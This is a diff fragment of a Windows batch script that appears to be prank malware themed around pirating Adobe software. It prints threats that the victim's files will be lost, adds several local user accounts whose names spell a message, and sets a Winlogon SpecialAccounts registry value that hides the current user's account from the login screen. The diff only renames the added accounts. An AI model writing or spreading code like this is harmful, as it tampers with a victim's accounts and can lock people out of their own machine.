@@ -22,12 +22,12 @@ echo Say goodbye to all your files!
 timeout /t 1
 echo FEEL THE RAGE OF ADOBE! FEEL PAIN AND REALIZE WHAT YOU HAVE DONE!
 timeout /t 3
-net user Adobe_(PW: PremierProSux) PremierProSux /add
-net user Piracy %username% /add
-net user is %username% /add
-net user not %username% /add
-net user a %username% /add
-net user game %username% /add
+net user Adobe /add
+net user A_Piracy %username% /add
+net user b_is %username% /add
+net user c_not %username% /add
+net user d_a %username% /add
+net user e_game %username% /add
 set "username=%username%"
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %username% /t REG_DWORD /d 0 /f
 (
